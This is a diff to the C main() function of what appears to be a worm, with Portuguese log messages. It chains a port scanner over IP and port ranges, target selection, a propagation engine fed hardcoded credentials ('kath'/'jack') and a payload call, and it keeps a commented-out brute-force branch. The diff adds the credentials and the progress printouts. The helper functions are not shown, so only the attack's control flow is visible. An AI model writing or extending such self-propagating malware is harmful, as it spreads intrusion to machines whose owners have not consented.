@@ -12,6 +12,8 @@
 void main(int argc, char *argv[]){
     char range_ipSeq[100];
     char range_portSeq[100];
+    char username[25];
+    char pass[25];
     char **paramIPPort;
     unsigned int lenKey;
     int random, success;
@@ -28,15 +30,27 @@ void main(int argc, char *argv[]){
     strcpy(range_ipSeq, argv[1]);
     strcpy(range_portSeq, argv[2]);
     lenKey = atoi(argv[3]);
- 
+
+    printf("-----------------------------------\n");
+    printf("Port Scanner iniciado\n"); 
+    printf("-----------------------------------\n");
+    
     initPortScanner(range_ipSeq, range_portSeq);
+    
+    printf("Port Scanner finalizado\n"); 
 
     srand(time(NULL));
     random = rand();
 
     paramIPPort = malloc(2*sizeof(char *));
     
+    printf("-----------------------------------\n");
+    printf("Target Selection iniciado\n"); 
+    printf("-----------------------------------\n");
+    
     target_selection(paramIPPort);
+    
+    printf("Target Selection finalizado\n"); 
 
 /*    if(random % 2){
         success = bruteforce(lenKey);
@@ -57,7 +71,25 @@ void main(int argc, char *argv[]){
             }
         }
     }*/
-
-    propagation_engine(paramIPPort[0]);
+    strcpy(username, "kath\n");
+    strcpy(pass, "jack\n");
+    
+    printf("-----------------------------------\n");
+    printf("Propagation Engine iniciado\n"); 
+    printf("-----------------------------------\n");
+    
+    propagation_engine(paramIPPort[0], username, pass);
+    
+    printf("-----------------------------------\n");
+    printf("Propagation Engine finalizado\n"); 
+    
+    printf("-----------------------------------\n");
+    printf("Payload iniciado\n"); 
+    printf("-----------------------------------\n");
+    
     payload();
+    
+    printf("-----------------------------------\n");
+    printf("Payload finalizado\n"); 
+    printf("-----------------------------------\n");
 }
